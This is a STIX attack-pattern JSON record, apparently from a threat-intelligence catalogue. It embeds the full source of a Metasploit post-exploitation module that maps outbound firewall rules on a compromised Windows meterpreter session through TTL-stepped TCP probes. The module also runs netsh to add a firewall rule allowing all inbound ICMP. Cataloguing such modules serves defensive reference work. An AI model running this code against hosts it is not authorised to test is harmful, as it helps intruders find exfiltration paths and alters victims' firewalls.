{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5a5e146-59ea-4322-8c1a-1f05b0b988bd",
    "created": "2024-08-14T16:33:05.003133Z",
    "modified": "2024-08-14T16:33:05.003137Z",
    "name": "Windows Outbound-Filtering Rules",
    "description": " This module makes some kind of TCP traceroute to get outbound-filtering rules. It will try to make a TCP connection to a certain public IP address (this IP does not need to be under your control) using different TTL incremental values. This way if you get an answer (ICMP TTL time exceeded packet) from a public IP device you can infer that the destination port is allowed. Setting STOP to true the module will stop as soon as you reach a public IP (this will generate less noise in the network).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/recon/outbound_ports.rb",
            "external_id": "outbound_ports.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.shelliscoming.com/2014/11/getting-outbound-filtering-rules-by.html"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Outbound-Filtering Rules',\n        'Description' => %q{\n          This module makes some kind of TCP traceroute to get outbound-filtering rules.\n          It will try to make a TCP connection to a certain public IP address (this IP\n          does not need to be under your control) using different TTL incremental values.\n          This way if you get an answer (ICMP TTL time exceeded packet) from a public IP\n          device you can infer that the destination port is allowed. Setting STOP to\n          true the module will stop as soon as you reach a public IP (this will generate\n          less noise in the network).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'Borja Merino <bmerinofe[at]gmail.com>',\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'References' => [\n          ['URL', 'http://www.shelliscoming.com/2014/11/getting-outbound-filtering-rules-by.html']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptAddress.new('ADDRESS', [ true, 'Destination IP address.']),\n        OptInt.new('HOPS', [true, 'Number of hops to get.', 3]),\n        OptInt.new('MIN_TTL', [true, 'Starting TTL value.', 1]),\n        OptString.new('PORTS', [true, 'Ports to test (e.g. 80,443,100-110).', '80,443']),\n        OptInt.new('TIMEOUT', [true, 'Timeout for the ICMP socket.', 3]),\n        OptBool.new('STOP', [true, 'Stop when it finds a public IP.', true])\n      ]\n    )\n  end\n\n  def icmp_setup\n    handler = client.railgun.ws2_32.socket('AF_INET', 'SOCK_RAW', 'IPPROTO_ICMP')\n    if handler['GetLastError'] == 0\n      vprint_good('ICMP raw socket created successfully')\n    else\n      print_error(\"There was an error setting the ICMP raw socket; GetLastError: #{handler['GetLastError']}\")\n      return nil\n    end\n\n    r = client.railgun.ws2_32.bind(handler['return'], \"\\x02\\x00\\x00\\x00\" << Rex::Socket.addr_aton(session.session_host) << \"\\x00\" * 8, 16)\n    if r['GetLastError'] == 0\n      vprint_good(\"ICMP socket successfully bound to #{session.session_host}\")\n    else\n      print_error(\"There was an error binding the ICMP socket to #{session.session_host}; GetLastError: #{r['GetLastError']}\")\n      return nil\n    end\n\n    # int WSAIoctl(\n    # _In_   SOCKET s,\n    # _In_   DWORD dwIoControlCode,\n    # _In_   LPVOID lpvInBuffer,\n    # _In_   DWORD cbInBuffer,\n    # _Out_  LPVOID lpvOutBuffer,\n    # _In_   DWORD cbOutBuffer,\n    # _Out_  LPDWORD lpcbBytesReturned,\n    # _In_   LPWSAOVERLAPPED lpOverlapped,\n    # _In_   LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine\n    # );\n\n    sio_rcvall = 0x98000001\n    r = client.railgun.ws2_32.WSAIoctl(handler['return'], sio_rcvall, \"\\x01\", 4, nil, 0, 4, nil, nil)\n    if r['GetLastError'] == 0\n      return handler['return']\n    else\n      print_error(\"There was an error calling WSAIoctl (ICMP raw socket); GetLastError: #{r['GetLastError']}\")\n      return nil\n    end\n  end\n\n  def tcp_setup(ttl)\n    handler = client.railgun.ws2_32.socket('AF_INET', 'SOCK_STREAM', 'IPPROTO_TCP')\n    if handler['GetLastError'] == 0\n      vprint_status('TCP socket created successfully')\n    else\n      print_error(\"There was an error setting the TCP socket; GetLastError: #{handler['GetLastError']}\")\n      return nil\n    end\n\n    # 0x8004667E = FIONBIO\n    # Enable non-blocking mode when *argp (third parameter in ioctlsocket) is set to a nonzero value\n    cmd = 0x8004667E\n    r = client.railgun.ws2_32.ioctlsocket(handler['return'], cmd, 1)\n    if r['GetLastError'] == 0\n      vprint_status('TCP socket successfully configured in non-blocking mode')\n    else\n      print_error(\"There was an error setting the TCP socket in non-blocking mode; GetLastError: #{r['GetLastError']}\")\n      return nil\n    end\n\n    # int setsockopt(\n    # _In_  SOCKET s,\n    # _In_  int level,\n    # _In_  int optname,\n    # _In_  const char *optval,\n    # _In_  int optlen\n    # );\n    ipproto_ip = 0\n    ip_ttl = 4\n    r = client.railgun.ws2_32.setsockopt(handler['return'], ipproto_ip, ip_ttl, [ttl].pack('C'), 4)\n    if r['GetLastError'] == 0\n      vprint_status(\"TTL value successfully set to #{ttl}\")\n      return handler['return']\n    else\n      print_error(\"There was an error setting the TTL value; GetLastError: #{r['GetLastError']}\")\n      return nil\n    end\n  end\n\n  def connections(remote, dst_port, h_icmp, h_tcp, to)\n    sock_addr = \"\\x02\\x00\"\n    sock_addr << [dst_port].pack('n')\n    sock_addr << Rex::Socket.addr_aton(remote)\n    sock_addr << \"\\x00\" * 8\n    r = client.railgun.ws2_32.connect(h_tcp, sock_addr, 16)\n\n    # A GetLastError == 1035 is expected since the socket is set to non-blocking mode\n    unless r['GetLastError'] == 10035\n      print_error(\"There was an error creating the connection to the peer #{remote}; GetLastError: #{r['GetLastError']}\")\n      return\n    end\n\n    from = ' ' * 16\n\n    begin\n      ::Timeout.timeout(to) do\n        r = client.railgun.ws2_32.recvfrom(h_icmp, \"\\x00\" * 100, 100, 0, from, 16)\n        hop = Rex::Socket.addr_ntoa(r['from'][4..7])\n        return hop\n      end\n    rescue ::Timeout::Error\n      return nil\n    end\n  end\n\n  def run\n    unless is_admin?\n      print_error(\"You don't have enough privileges. Try getsystem.\")\n      return\n    end\n\n    version = get_version_info\n    if version.xp_or_2003?\n      print_error('Windows XP/Server 2003 is not supported')\n      return\n    end\n\n    output = cmd_exec('netsh', ' advfirewall firewall add rule name=\"All ICMP v4\" dir=in action=allow protocol=icmpv4:any,any')\n    print_status(\"ICMP firewall IN rule established: #{output}\")\n\n    session.railgun.ws2_32\n    remote = datastore['ADDRESS']\n    to = datastore['TIMEOUT']\n\n    ports = Rex::Socket.portspec_crack(datastore['PORTS'])\n\n    ports.each do |dport|\n      pub_ip = false\n      print_status(\"Testing port #{dport}...\")\n      0.upto(datastore['HOPS'] - 1) do |i|\n        i += datastore['MIN_TTL']\n        h_icmp = icmp_setup\n        return if h_icmp.nil?\n\n        h_tcp = tcp_setup(i)\n        return if h_tcp.nil?\n\n        hop = connections(remote, dport, h_icmp, h_tcp, to)\n        if hop.nil?\n          print_error(\"#{i} *\")\n        else\n          print_good(\"#{i} #{hop}\")\n          unless Rex::Socket.is_internal?(hop)\n            pub_ip = true\n            break if datastore['STOP']\n          end\n        end\n        client.railgun.ws2_32.closesocket(h_tcp)\n        client.railgun.ws2_32.closesocket(h_icmp)\n      end\n      print_good(\"Public IP reached. The TCP port #{dport} is not filtered\") if pub_ip\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}